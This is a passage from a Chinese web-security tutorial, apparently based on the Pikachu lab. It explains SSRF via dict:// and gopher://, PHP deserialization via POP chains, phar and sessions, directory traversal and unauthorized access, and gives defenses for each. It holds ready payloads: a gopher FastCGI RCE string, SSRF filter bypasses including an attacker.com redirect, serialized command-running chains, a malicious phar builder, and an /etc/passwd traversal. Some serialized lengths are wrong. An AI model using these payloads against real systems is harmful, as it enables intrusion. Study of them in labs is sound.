然后执行 `ssh -i 私钥 root@目标IP`，直接进去！🔓

> **生活小例子** 🎯
> 
> dict:// 打 Redis 就像什么？
> 
> 你家小区门口（公网）有个快递站（Web服务器），小区里有个大管家（Redis），管家平时帮大家存东西，而且谁喊都答应（无密码）。
> 
> 你不能直接进小区，但是你可以通过快递站帮你传话给管家：
> - "管家，把我存的东西放到302住户（网站根目录）的桌子上，名字叫shell.php"
> - 管家傻乎乎照做了
> - 然后你就能控制302住户家了！🏠

---

### 进阶玩法二：gopher:// 协议——万能攻击利器 🦾

如果说 dict:// 是"手枪"，那 `gopher://` 就是"加特林机关枪"！🔥

`gopher://` 协议可以让我们构造**任意 TCP 数据包**，想发什么就发什么。只要是基于 TCP 的服务，gopher:// 都能打！

#### 能打啥？ 🤯

| 目标服务 | 作用 |
|---------|------|
| HTTP POST | 攻击内网的 Web 应用（提交表单、传 webshell）|
| FastCGI (9000) | PHP-FPM 未授权访问，直接执行任意代码 |
| Redis (6379) | 比 dict:// 更灵活，一次发送多条命令 |
| MySQL (3306) | 伪造 MySQL 客户端，执行 SQL |
| SMTP (25) | 发送恶意邮件 |
| 内网其他 TCP 服务 | 几乎无所不能 |

#### 实战演示一：gopher:// 打 FastCGI 拿 RCE 💣

PHP-FPM 默认监听 127.0.0.1:9000，很多人配置不当导致可以被未授权访问。配合 SSRF + gopher，我们可以直接让 PHP-FPM 执行任意代码！

攻击原理：
1. PHP-FPM 是通过 FastCGI 协议通信的，FastCGI 包是二进制的
2. gopher:// 可以发送任意二进制数据
3. 我们构造一个 FastCGI 请求，让它去执行 `php -r '命令'` 或者包含某个文件
4. 用 SSRF 发送到 127.0.0.1:9000，就能执行命令！

Gopher Payload 示例（节选，完整包很长）：

```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0D%01%02%44%4F%43%55%4D%45%4E%54%5F%52%4F%4F%54%20%2F%76%61%72%2F%77%77%77%2F%68%74%6D%6C%0D%01%10%53%43%52%49%50%54%5F%46%49%4C%45%4E%41%4D%45%20%2F%76%61%72%2F%77%77%77%2F%68%74%6D%6C%2F%69%6E%64%65%78%2E%70%68%70%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%61%04%00%3C%3F%70%68%70%20%73%79%73%74%65%6D%28%27%77%68%6F%61%6D%69%27%29%3B%20%3F%3E
```

> **小提示** 💡
> 
> 手工构造 gopher 的 Payload 太反人类了！推荐用工具自动生成：
> - `Gopherus`：https://github.com/tarunkant/Gopherus （一键生成Redis/FastCGI/MySQL等gopher payload）
> - `gopher-proxy`：代理抓包转gopher

---

### 进阶玩法三：SSRFBypass 绕口令技巧 🌀

很多网站会对 SSRF 做一些防护，比如过滤掉 `127.0.0.1`、`localhost`、`10.0.0.0/8` 这些内网地址。但是魔高一尺道高一丈，我们有各种绕过技巧！

#### 常见 Bypass 方式一览

| 方法 | 示例 | 原理 |
|------|------|------|
| **302跳转** | `http://attacker.com/302.php?url=127.0.0.1` | 服务器请求你的302页面，你返回302跳转到内网地址 |
| **DNS重绑定** | `http://7f000001.c8d15e2e.rbnd.us/` | 第一次DNS解析到外网（过校验），第二次解析到内网 |
| **特殊进制IP** | `http://2130706433/` (十进制的127.0.0.1) <br> `http://0x7f000001/` (十六进制) <br> `http://0177.0.0.1/` (八进制) | 程序员只过滤了点分十进制，这些格式最终都解析到127.0.0.1 |
| **xip.io / nip.io** | `http://127.0.0.1.xip.io` <br> `http://10-0-0-1.nip.io` | 这些域名会解析成对应格式里的IP，绕过域名白名单 |
| **短链接** | `http://t.cn/xxxx` | 短链接重定向到内网地址 |
| **[::] 闭合** | `http://[::]:80/` | IPv6 的 localhost 表示法 |
| **句号变体** | `http://127。0。0。1` (中文句号) | 有些解析器会把中文句号转成英文句号 |
| **缺省位** | `http://127.1` <br> `http://10.1` | 省略的位会被补0，分别等于127.0.0.1和10.0.0.1 |

#### 实战 Payload 收集 🎒

```
# 十进制
http://2130706433/ → 解析到 127.0.0.1
http://3232235521/ → 解析到 192.168.0.1

# 十六进制
http://0x7f000001/ → 127.0.0.1
http://0x0a000001/ → 10.0.0.1

# 混合进制
http://0x7f.0.0.1 → 127.0.0.1

# xip.io（域名解析服务）
http://127.0.0.1.xip.io → 解析到 127.0.0.1
http://10.0.0.1.xip.io → 解析到 10.0.0.1
http://myservice.127.0.0.1.xip.io → 也能解析

# 特殊域名
http://localtest.me → 解析到 127.0.0.1
http://lvh.me → 解析到 127.0.0.1（LVH = Local Virtual Host）
```

---

### SSRF 攻击全景图 SVG 🗺️

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 520" width="800" height="520">
  <defs>
    <linearGradient id="ssrf_bg" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#ecfdf5;stop-opacity:1" />
      <stop offset="100%" style="stop-color:#a7f3d0;stop-opacity:1" />
    </linearGradient>
  </defs>
  <rect width="800" height="520" fill="url(#ssrf_bg)" rx="15"/>
  <text x="400" y="36" text-anchor="middle" font-size="24" font-weight="bold" fill="#065f46">SSRF 攻击全景图</text>
  
  <!-- Attacker -->
  <rect x="30" y="220" width="100" height="70" rx="10" fill="#10b981" stroke="#065f46" stroke-width="2"/>
  <text x="80" y="250" text-anchor="middle" font-size="15" font-weight="bold" fill="#ffffff">👨‍💻 攻击者</text>
  <text x="80" y="270" text-anchor="middle" font-size="11" fill="#ffffff">发送SSRF Payload</text>
  
  <!-- 箭头到Web服务器 -->
  <line x1="130" y1="255" x2="240" y2="255" stroke="#065f46" stroke-width="2" marker-end="url(#ssrf_arrow)"/>
  <text x="185" y="245" text-anchor="middle" font-size="11" fill="#065f46">1.请求URL参数</text>
  
  <!-- Web Server（前台小姐姐） -->
  <rect x="240" y="220" width="110" height="70" rx="10" fill="#34d399" stroke="#065f46" stroke-width="3"/>
  <text x="295" y="250" text-anchor="middle" font-size="15" font-weight="bold" fill="#064e3b">🌐 Web服务器</text>
  <text x="295" y="270" text-anchor="middle" font-size="11" fill="#064e3b">发起请求(SSRF点)</text>
  
  <!-- 协议分支 -->
  <!-- file:// -->
  <line x1="295" y1="220" x2="170" y2="110" stroke="#7c3aed" stroke-width="2" marker-end="url(#ssrf_arrow)"/>
  <rect x="80" y="60" width="150" height="50" rx="8" fill="#ede9fe" stroke="#7c3aed" stroke-width="2"/>
  <text x="155" y="85" text-anchor="middle" font-size="13" font-weight="bold" fill="#6d28d9">📄 file:// 读本地文件</text>
  <text x="155" y="102" text-anchor="middle" font-size="11" fill="#6d28d9">/etc/passwd /flag</text>
  
  <!-- http:// 内网扫描 -->
  <line x1="320" y1="220" x2="400" y2="110" stroke="#059669" stroke-width="2" marker-end="url(#ssrf_arrow)"/>
  <rect x="330" y="60" width="150" height="50" rx="8" fill="#d1fae5" stroke="#059669" stroke-width="2"/>
  <text x="405" y="85" text-anchor="middle" font-size="13" font-weight="bold" fill="#047857">🔍 http:// 内网扫描</text>
  <text x="405" y="102" text-anchor="middle" font-size="11" fill="#047857">扫端口/访问未授权Web</text>
  
  <!-- dict:// Redis -->
  <line x1="350" y1="255" x2="480" y2="215" stroke="#dc2626" stroke-width="2" marker-end="url(#ssrf_arrow)"/>
  <rect x="480" y="180" width="150" height="60" rx="8" fill="#fee2e2" stroke="#dc2626" stroke-width="2"/>
  <text x="555" y="203" text-anchor="middle" font-size="13" font-weight="bold" fill="#991b1b">🏗️ dict:// 打Redis</text>
  <text x="555" y="220" text-anchor="middle" font-size="11" fill="#991b1b">写Webshell/定时任务/SSH</text>
  
  <!-- gopher:// -->
  <line x1="350" y1="290" x2="480" y2="340" stroke="#ea580c" stroke-width="2" marker-end="url(#ssrf_arrow)"/>
  <rect x="480" y="320" width="160" height="65" rx="8" fill="#ffedd5" stroke="#ea580c" stroke-width="2"/>
  <text x="560" y="343" text-anchor="middle" font-size="13" font-weight="bold" fill="#9a3412">🦾 gopher:// 万能攻击</text>
  <text x="560" y="360" text-anchor="middle" font-size="11" fill="#9a3412">FastCGI/MySQL/POST表单</text>
  <text x="560" y="376" text-anchor="middle" font-size="11" fill="#9a3412">任意TCP数据都能发</text>
  
  <!-- Bypass -->
  <line x1="295" y1="290" x2="170" y2="390" stroke="#0891b2" stroke-width="2" marker-end="url(#ssrf_arrow)"/>
  <rect x="70" y="365" width="170" height="60" rx="8" fill="#cffafe" stroke="#0891b2" stroke-width="2"/>
  <text x="155" y="388" text-anchor="middle" font-size="13" font-weight="bold" fill="#0e7490">🌀 Bypass技巧</text>
  <text x="155" y="405" text-anchor="middle" font-size="11" fill="#0e7490">十进制IP/302/xip.io</text>
  <text x="155" y="420" text-anchor="middle" font-size="11" fill="#0e7490">DNS重绑定/短链接</text>
  
  <!-- MySQL 打库 -->
  <line x1="320" y1="290" x2="400" y2="440" stroke="#0369a1" stroke-width="2" marker-end="url(#ssrf_arrow)"/>
  <rect x="330" y="440" width="160" height="60" rx="8" fill="#dbeafe" stroke="#0369a1" stroke-width="2"/>
  <text x="410" y="463" text-anchor="middle" font-size="13" font-weight="bold" fill="#075985">🗄️ gopher打MySQL</text>
  <text x="410" y="480" text-anchor="middle" font-size="11" fill="#075985">LOAD_FILE读文件/UDF提权</text>
  <text x="410" y="496" text-anchor="middle" font-size="11" fill="#075985">SELECT INTO OUTFILE写马</text>
  
  <!-- 综合内网 -->
  <rect x="650" y="220" width="130" height="70" rx="10" fill="#fef3c7" stroke="#b45309" stroke-width="2"/>
  <text x="715" y="250" text-anchor="middle" font-size="15" font-weight="bold" fill="#92400e">🏢 内网资源</text>
  <text x="715" y="268" text-anchor="middle" font-size="11" fill="#92400e">Redis/MySQL/ElasticSearch</text>
  <text x="715" y="282" text-anchor="middle" font-size="11" fill="#92400e">Jenkins/Nacos/K8s API</text>
  <line x1="640" y1="255" x2="650" y2="255" stroke="#b45309" stroke-width="2" marker-end="url(#ssrf_arrow)"/>
  
  <defs>
    <marker id="ssrf_arrow" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
      <polygon points="0 0, 10 3, 0 6" fill="#065f46" />
    </marker>
  </defs>
</svg>

---

### SSRF 防御手册 🛡️

SSRF 怎么防？记住下面几条铁律：

1. **协议白名单**：只允许 `http://` 和 `https://`，禁掉 file/dict/gopher/ftp 等所有其他协议
2. **IP黑名单**：禁止请求 `127.0.0.0/8`、`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16` 等内网网段
3. **返回信息不透露**：不要把请求的响应内容（包括错误信息）返回给用户，防止 Blind SSRF
4. **统一错误页**：请求超时、失败、成功都返回同样的页面，防止基于时间差的端口扫描
5. **URL校验 + DNS重绑定防护**：先解析域名→校验IP→用校验过的IP去请求（而不是再次解析域名）

> **小提示** 💡
> 
> SSRF 现在在真实渗透测试中出现率极高！尤其是微服务架构流行的今天，服务之间互相调用频繁，稍微不注意就能挖到 SSRF。
> 
> 挖洞的时候看到这些关键词，脑子要"叮"一下：
> `url=` `uri=` `path=` `src=` `link=` `href=` `img=` `download=` `fetch=` `proxy=` `callback=` `redirect=`
> 
> 每个都扔几个 SSRF Payload 试试，说不定就挖到了！🍀

好了，SSRF 的进阶玩法我们就讲到这里。内容比较多，消化一下，我们继续看 PHP 反序列化还有什么狠活！🚀

---

## PHP反序列化：把字符串变对象 📦

接下来这个漏洞，名字听着就挺难的——**PHP反序列化漏洞**。

没错，这个确实比较难，新手阶段了解一下概念就行，不用太深究。我们就当听故事一样听着玩~

### 什么是反序列化？

首先，什么是序列化？什么是反序列化？

用大白话讲：
- **序列化**：把对象变成字符串（就像把衣服叠起来打包）
- **反序列化**：把字符串变回对象（就像把包裹拆开，衣服拿出来）

> **生活小例子** 🎯
> 
> 想象一下：
> - 你有一个玩具熊，想寄给远方的朋友
> - 你把玩具熊装进盒子里（序列化）→ 变成了一个盒子（字符串）
> - 朋友收到盒子，打开盒子（反序列化）→ 又变回了玩具熊（对象）
> 
> 序列化就是打包，反序列化就是拆包。📦

PHP里序列化和反序列化的函数：
- `serialize()`：序列化，把对象变成字符串
- `unserialize()`：反序列化，把字符串变回对象

那漏洞在哪呢？

问题就出在：如果反序列化的**数据是用户可控的！

用户能控制要反序列化的字符串，那用户就能构造恶意的对象数据，配合PHP对象里有一些特殊的方法，叫"魔法方法"。

比如：
- `__wakeup()`：反序列化的时候自动调用
- `__destruct()`：对象销毁的时候自动调用
- `__toString()`：对象被当成字符串的时候调用
- 还有很多其他魔法方法...

如果这些魔法方法里有危险的操作（比如写文件、执行命令），那用户构造的对象，反序列化的时候，这些方法就自动执行了！

> **生活小例子** 🎯
> 
> 想象一下：
> - 你收到一个包裹，正常包裹里是玩具熊
> - 但是坏人给你寄了一个炸弹包裹
> - 你一拆开（反序列化），炸弹就炸了（执行了危险代码）
> 
> 反序列化漏洞就是这样！你拆的时候，就自动执行了坏东西。💣

大概就是这么个意思。新手阶段知道个大概其，反正就是：用户构造一个恶意的序列化字符串，服务器一解析，就出问题了。

### Pikachu里的反序列化演示

我们来看看Pikachu里的反序列化模块，打开"反序列化"模块。

页面上有个输入框，让我们输入一个序列化后的字符串。

我们先看看正常的是什么样的？我们来构造一个简单的对象，正常的对象有个对象是什么样的？

Pikachu的反序列化漏洞里有个提示，我们先看看源码提示：

大概意思是：有个类，里面有个属性，反序列化的时候会调用某个方法，这个方法里有危险操作。

我们来构造一个Payload：

先看看Pikachu里反序列化的那个类长什么样？大概是这样的（大概吧）：
```php
class Test{
    public $str;
    function __destruct(){
        // 这里有危险操作，比如eval($this->str);
    }
}
```

那我们构造一个序列化后的对象：

```
O:4:"Test":1:{s:3:"str";s:10:"phpinfo();";}
```

（具体的Payload要看具体情况而定，我们这里就不细抠细节了，大家知道有这么个东西就行。

提交之后，应该就能执行代码了！

---

### 进阶一：POP链——搭积木实现危险操作 🧱

刚才那个例子是"魔法方法里直接就有eval"，这种属于送分题，真实情况里哪有这么好心的程序员？😅

**99%的实际情况是：魔法方法里没有直接危险操作，但是魔法方法调用了A类的方法，A类的方法调用了B类的属性…… 一路调用下去，最终某个角落有eval！**

这种把多个类的调用链拼起来最终达到RCE的技术，就叫 **POP链（Property Oriented Programming，属性导向编程）**。

#### 原理大白话 🍭

POP链就像**多米诺骨牌**：
- 你推倒第一张牌（触发魔法方法 `__destruct`）
- 第一张撞倒第二张（`__destruct` 里调用了 `$this->obj->clean()`）
- 第二张撞倒第三张（`clean()` 里又调用了 `$this->cache->get()`）
- ……一路撞下去……
- 最后一张牌是个炸弹（`eval($this->code)`）💥

只要我们把每一张"牌"（对象的属性）都设置成我们想要的，推一下第一张，整个链就自动执行了！

#### 经典 POP 链示例 🔗

假设CMS里有三个类：

```php
// 第一张骨牌：入口
class Logger {
    public $handler;
    function __destruct() {
        $this->handler->close(); // 调用handler的close方法
    }
}

// 第二张骨牌：中转
class FileHandler {
    public $cacheFile;
    function close() {
        echo file_get_contents($this->cacheFile); // 读取文件
    }
}

// 第三张骨牌：触发__toString
class DbConfig {
    public $dsn;
    function __toString() { // 被当字符串时调用
        system($this->dsn); // 执行命令！💥
    }
}
```

看到没？虽然没有哪个魔法方法直接执行命令，但我们可以这样构造链：

1. `Logger::__destruct()` → 调用 `FileHandler::close()`
2. `FileHandler::close()` → 执行 `file_get_contents($this->cacheFile)`
3. 如果 `$cacheFile` 是个 `DbConfig` 对象，`file_get_contents` 会把它当字符串 → 触发 `DbConfig::__toString()`
4. `DbConfig::__toString()` 里有 `system()`！RCE！🎉

序列化字符串就是把这三个对象组装起来：

```
O:6:"Logger":1:{s:7:"handler";O:11:"FileHandler":1:{s:9:"cacheFile";O:8:"DbConfig":1:{s:3:"dsn";s:10:"whoami > /tmp/pwned";}}}
```

> **生活小例子** 🎯
> 
> POP链就像**古代打仗点烽火台**：
> - 你点了第一个烽火台（反序列化入口）
> - 第一个烽火台的守卫看到了，点第二个（调用链传导）
> - 第二个看到点第三个……
> - 最后一个烽火台看到后，就出兵打仗（执行恶意代码）⚔️
> 
> 你只需要点一下第一个，后面的连锁反应就自动发生了！

---

### 进阶二：phar:// 伪协议——无 unserialize() 也能打 🎯

如果程序里**没有直接调用 `unserialize()`**，那是不是就没有反序列化漏洞了？**No！** 有一种神级技巧——**phar:// 伪协议**，只要程序调用了某些文件系统函数，**即使没调用 unserialize()，也能触发反序列化！** 😱

#### 原理揭秘 🔬

PHAR（PHP Archive）是PHP的归档文件格式，类似Java的JAR。一个PHAR文件由4部分组成：
1. Stub：`<?php __HALT_COMPILER(); ?>`
2. **Manifest：清单信息，这里面存了PHAR里文件的元数据——而元数据就是以序列化字符串形式存储的！**
3. 文件内容
4. 签名

PHP的文件系统函数（`file_exists()`、`file_get_contents()`、`is_dir()`、`include()` 等等）在解析 `phar://` 伪协议时，**会自动反序列化 Manifest 里的元数据！**

所以只要：
1. 你能上传一个文件（哪怕后缀改成.jpg、.png都行）
2. 上传的文件内容里能包含完整的PHAR结构
3. 有某个参数你能控制，程序会把它传给文件系统函数（比如"图片预览"功能传路径）

**满足这三条，就能触发反序列化！**

#### 利用流程三步法 🪜

**第一步：构造恶意 PHAR 文件**

我们写个PHP脚本生成PHAR：

```php
<?php
// 我们要反序列化的POP链对象
class DbConfig {
    public $dsn = 'whoami > /tmp/pwn.txt';
}
$obj = new DbConfig();

// 生成phar
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>'); // 必须有
$phar->setMetadata($obj); // 元数据里放我们的POP链对象
$phar->addFromString('test.txt', 'test'); // 随便加个文件
$phar->stopBuffering();

// 重命名成 jpg 绕过图片上传
copy('evil.phar', 'evil.jpg');
echo "PHAR生成完毕！\n";
```

**第二步：上传 evil.jpg**

随便找个图片上传点，把 evil.jpg 传上去，假设路径是 `/upload/evil.jpg`。

**第三步：用 phar:// 协议触发**

找到图片预览功能，比如有个参数 `?img=/upload/evil.jpg`，我们改成：

```
?img=phar://./upload/evil.jpg
```

程序调用 `file_exists($_GET['img'])` 或者 `filesize()` 的时候，就会自动反序列化我们放在PHAR元数据里的POP链！RCE达成！🎉

> **生活小例子** 🎯
> 
> phar:// 打反序列化就像什么？
> 
> 你去公司上班，公司规定："不准直接带打火机进大楼（不准直接调用unserialize）"
> 
> 但是你发现一个漏洞——公司的"体检X光机"（文件系统函数）会自动检查每个人的包，只要看到包里有"特殊金属物"（PHAR的Manifest），就会自动拆开看（自动反序列化）！
> 
> 于是你把打火机（POP链对象）装在一个"体检必查礼盒"（PHAR文件）里，光明正大带进大楼。经过X光机的时候，X光机自动拆开礼盒把打火机点着了！🔥

---

### 进阶三：Session 反序列化——Session里的定时炸弹 💣

PHP的 `Session` 默认存在文件里（`/var/lib/php/sessions/sess_xxx`），文件内容就是序列化后的Session数据。但是——PHP有3种不同的序列化处理器，处理格式不一样！

| 处理器 | 格式示例 |
|-------|---------|
| php | `key|a:1:{s:3:"bar";i:1;}` |
| php_binary | 键名长度+键名+序列化数据 |
| php_serialize(php>=5.5.4) | `a:1:{s:3:"foo";a:1:{s:3:"bar";i:1;}}` |

**漏洞就出在：写Session用的是 php_serialize 处理器，读的时候用 php 处理器！** 格式对不上，php处理器就会把 `|` 后面的内容**当成序列化字符串去解析**，导致反序列化注入！

#### 漏洞示例 🔧

写Session的代码（php_serialize）：
```php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION['test'] = $_GET['x']; // 用户可控
```

读Session的代码（php处理器）：
```php
ini_set('session.serialize_handler', 'php');
session_start(); // 这里会用php格式解析，触发漏洞！
```

攻击者访问：`?x=|O:8:"DbConfig":1:{s:3:"dsn";s:10:"touch /tmp/x";}`

`php_serialize` 写入 sess 文件：
```
test|s:46:"|O:8:"DbConfig":1:{s:3:"dsn";s:10:"touch /tmp/x";}";
```

然后 `php` 处理器读这个文件时，看到第一个 `|`，就认为它是"键分隔符"，把后面的内容——也就是我们注入的 `O:8:"DbConfig"...` ——当作序列化数据去解析！反序列化触发！💥

---

### PHP反序列化攻击全景图 SVG 🗺️

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" width="800" height="500">
  <defs>
    <linearGradient id="ser_bg" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#faf5ff;stop-opacity:1" />
      <stop offset="100%" style="stop-color:#ddd6fe;stop-opacity:1" />
    </linearGradient>
  </defs>
  <rect width="800" height="500" fill="url(#ser_bg)" rx="15"/>
  <text x="400" y="35" text-anchor="middle" font-size="24" font-weight="bold" fill="#5b21b6">PHP反序列化漏洞全景图</text>
  
  <!-- 入口：unserialize -->
  <rect x="340" y="70" width="120" height="60" rx="10" fill="#a78bfa" stroke="#5b21b6" stroke-width="3"/>
  <text x="400" y="100" text-anchor="middle" font-size="15" font-weight="bold" fill="#3b0764">🎯 触发入口</text>
  <text x="400" y="116" text-anchor="middle" font-size="11" fill="#3b0764">unserialize(用户可控)</text>
  
  <!-- 魔法方法 -->
  <rect x="60" y="180" width="180" height="90" rx="8" fill="#ede9fe" stroke="#7c3aed" stroke-width="2"/>
  <text x="150" y="205" text-anchor="middle" font-size="14" font-weight="bold" fill="#5b21b6">🧙 魔法方法 (1跳RCE)</text>
  <text x="150" y="223" text-anchor="middle" font-size="11" fill="#5b21b6">__wakeup / __destruct / __toString</text>
  <text x="150" y="238" text-anchor="middle" font-size="11" fill="#5b21b6">方法内直接 eval() / system()</text>
  <text x="150" y="255" text-anchor="middle" font-size="11" fill="#5b21b6">✅ 简单，送分题</text>
  <line x1="370" y1="120" x2="210" y2="180" stroke="#5b21b6" stroke-width="2" marker-end="url(#ser_arrow)"/>
  
  <!-- POP链 -->
  <rect x="310" y="180" width="180" height="90" rx="8" fill="#ede9fe" stroke="#7c3aed" stroke-width="2"/>
  <text x="400" y="205" text-anchor="middle" font-size="14" font-weight="bold" fill="#5b21b6">🧱 POP链 (多米诺骨牌)</text>
  <text x="400" y="223" text-anchor="middle" font-size="11" fill="#5b21b6">A::__destruct → B::clean() → C::render()</text>
  <text x="400" y="238" text-anchor="middle" font-size="11" fill="#5b21b6">最终某处调用 eval / call_user_func</text>
  <text x="400" y="255" text-anchor="middle" font-size="11" fill="#5b21b6">🔥 常见，PHP CMS通用链</text>
  <line x1="400" y1="130" x2="400" y2="180" stroke="#5b21b6" stroke-width="2" marker-end="url(#ser_arrow)"/>
  
  <!-- phar -->
  <rect x="560" y="180" width="180" height="90" rx="8" fill="#ede9fe" stroke="#7c3aed" stroke-width="2"/>
  <text x="650" y="205" text-anchor="middle" font-size="14" font-weight="bold" fill="#5b21b6">📦 phar:// 伪协议</text>
  <text x="650" y="223" text-anchor="middle" font-size="11" fill="#5b21b6">无需unserialize()!</text>
  <text x="650" y="238" text-anchor="middle" font-size="11" fill="#5b21b6">file_exists()/filesize()自动触发</text>
  <text x="650" y="255" text-anchor="middle" font-size="11" fill="#5b21b6">💎 高级，配合上传拿RCE</text>
  <line x1="430" y1="120" x2="590" y2="180" stroke="#5b21b6" stroke-width="2" marker-end="url(#ser_arrow)"/>
  
  <!-- Session -->
  <rect x="60" y="320" width="180" height="90" rx="8" fill="#fce7f3" stroke="#be185d" stroke-width="2"/>
  <text x="150" y="345" text-anchor="middle" font-size="14" font-weight="bold" fill="#9d174d">💣 Session反序列化</text>
  <text x="150" y="363" text-anchor="middle" font-size="11" fill="#9d174d">写入: php_serialize</text>
  <text x="150" y="378" text-anchor="middle" font-size="11" fill="#9d174d">读取: php (使用|分隔)</text>
  <text x="150" y="394" text-anchor="middle" font-size="11" fill="#9d174d">格式不匹配导致注入</text>
  <line x1="370" y1="250" x2="180" y2="320" stroke="#be185d" stroke-width="2" marker-end="url(#ser_arrow)"/>
  
  <!-- 数据库/其他 -->
  <rect x="310" y="320" width="180" height="90" rx="8" fill="#fce7f3" stroke="#be185d" stroke-width="2"/>
  <text x="400" y="345" text-anchor="middle" font-size="14" font-weight="bold" fill="#9d174d">💾 MySQL/Redis反序列化</text>
  <text x="400" y="363" text-anchor="middle" font-size="11" fill="#9d174d">数据从DB/Redis读取后反序列化</text>
  <text x="400" y="378" text-anchor="middle" font-size="11" fill="#9d174d">SQL注入→写入恶意序列化→RCE</text>
  <text x="400" y="394" text-anchor="middle" font-size="11" fill="#9d174d">⛓️ 组合利用，隐蔽性极高</text>
  <line x1="400" y1="270" x2="400" y2="320" stroke="#be185d" stroke-width="2" marker-end="url(#ser_arrow)"/>
  
  <!-- 防御 -->
  <rect x="560" y="320" width="180" height="90" rx="8" fill="#dcfce7" stroke="#166534" stroke-width="2"/>
  <text x="650" y="345" text-anchor="middle" font-size="14" font-weight="bold" fill="#166534">🛡️ 防御措施</text>
  <text x="650" y="363" text-anchor="middle" font-size="11" fill="#166534">① unserialize入口白名单类(__unserialize)</text>
  <text x="650" y="378" text-anchor="middle" font-size="11" fill="#166534">② 禁用phar:// / 禁止上传+解析phar</text>
  <text x="650" y="394" text-anchor="middle" font-size="11" fill="#166534">③ Session处理器统一，不用php格式</text>
  <line x1="430" y1="250" x2="620" y2="320" stroke="#166534" stroke-width="2" marker-end="url(#ser_arrow)"/>
  
  <defs>
    <marker id="ser_arrow" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
      <polygon points="0 0, 10 3, 0 6" fill="#5b21b6" />
    </marker>
  </defs>
</svg>

---

### 反序列化漏洞防御（终极版）🛡️

| 措施 | 效果 |
|------|------|
| 反序列化时传 **allowed_classes** 参数 | 只允许指定类被反序列化，禁用"万能POP链" |
| 统一使用 **json_encode/json_decode** | JSON没有"魔法方法"，从根本上杜绝反序列化漏洞 |
| 禁用 phar:// 流包装器 | `stream_wrapper_unregister('phar')` 或 disable_classes |
| Session使用 **php_serialize** 处理器（读和写统一） | 避免Session格式不匹配注入 |
| 不把用户输入直接存入序列化数据 | 减少"反序列化入口"被污染的机会 |

> **小提示** 💡
> 
> PHP反序列化漏洞进阶的内容比较硬核，零基础的同学看到这里可能有点懵——**完全没关系！**
> 你只要记住这几点就行：
> 1. 反序列化漏洞危害极大，可直接RCE
> 2. 不是非要看到 `unserialize()` 函数才叫反序列化漏洞，phar:// 更厉害
> 3. 以后代码审计遇到文件系统函数 + 上传功能，要想起phar
> 4. 等以后PHP基础扎实了，再回来啃POP链和各种通用链（ThinkPHP、Laravel、WordPress、Drupal等）

好了，PHP反序列化的狠活我们就分享到这里。接下来是目录遍历和未授权访问，我们也补充一些实用技巧！�

---

## 目录遍历：../../能翻到外面去 📂

接下来这个漏洞比较简单——**目录遍历**，也叫"路径遍历"。

### 什么是目录遍历？

用大白话讲：**就是通过 ../ 这样的东西，能访问到web目录外面的文件**。

> **生活小例子** 🎯
> 
> 想象一下：
> - 你去酒店住，酒店给你一把房间钥匙，只能开你自己房间的门
> - 正常情况：你用钥匙开自己房间 ✅
> 
> 但是酒店的锁有问题：
> - 你用钥匙，说"我要开../隔壁房间"
> - 酒店真的给你开了隔壁房间的门... 🚪
> 
> 这就是目录遍历！本来你只能访问web目录里的文件，结果你通过../../就能访问到外面去了。

目录遍历和文件包含有点像，但又不一样：
- 文件包含：是包含执行PHP文件
- 目录遍历：是读取文件内容，不一定执行

就像一个是把文件拿过来运行，一个是把文件内容读出来看。

### Pikachu里的目录遍历演示

我们来看看Pikachu里的目录遍历模块。打开"目录遍历"模块。

页面上有几个文件，点一下就能看。

我们点一下第一个文件，看看URL变成什么样的？
```
.../vul/dir/dir_list.php?title=jar.php
```

哦？title参数是文件名？那我们试试../../？

我们来试试：
```
.../vul/dir/dir_list.php?title=../../../etc/passwd
```

（Windows的话试试../../../windows/win.ini）

哎？是不是读到外面的文件了？😎

看到没？这就是目录遍历！通过../往上翻，翻到web目录外面去了！

目录遍历漏洞，原因就是没有对用户输入的文件名没有过滤，用户输入啥就用啥。就像你让前台帮你拿文件，你说拿啥她拿啥，你说拿老板保险柜里的她也去拿... 📂

好了，目录遍历就讲到这里。比较简单，大家理解起来也容易懂。我们继续！🚶

---

## 未授权访问：不用登录就能进 🚪

接下来这个漏洞也很简单，但是现实中超级常见——**未授权访问**。

### 什么是未授权访问？

用大白话讲：**本来应该登录才能访问的页面，你不用登录就能直接访问。

> **生活小例子** 🎯
> 
> 想象一下：
> - 你公司有个后台管理系统，只有管理员才能进
> - 正常情况：你得输入用户名密码才能进 ✅
> 
> 但是系统有问题：
> - 你直接在浏览器里输入后台地址
> - 直接就进去了... 连密码都不用输... 🚪
> 
> 这就是未授权访问！就像你家大门没锁，谁都能进。

为什么会有未授权访问？很简单——开发人员忘了加权限验证，比如某个页面，开发的时候没写判断用户有没有登录，直接就显示了。

就像你家门装了锁，但是出门忘锁了。🔑

### 典型例子

未授权访问最典型的例子就是：
- 管理后台不用登录就能进
- 用户中心不用登录就能看
- 某个接口不用鉴权就能调用
- 等等...

现实中这种漏洞可多了去了。很多开发人员只顾着写功能，忘了加权限控制。结果一抓一大把。🤦‍♂️

### Pikachu里的未授权访问演示

Pikachu里有个"越权访问"模块，里面有水平越权、垂直越权。

其实越权和未授权访问有点像，但又不一样：
- 未授权访问：完全不用登录
- 越权：登录了，但是能访问别人的东西（水平越权）或者能访问更高权限的东西（垂直越权）

> **生活小例子** 🎯
> 
> - 未授权访问：你不是公司员工，但是能直接进公司大门
> - 水平越权：你是公司员工，你能看同事的工资条
> - 垂直越权：你是普通员工，你能进老板办公室
> 
> 都是权限控制没做好。🔒

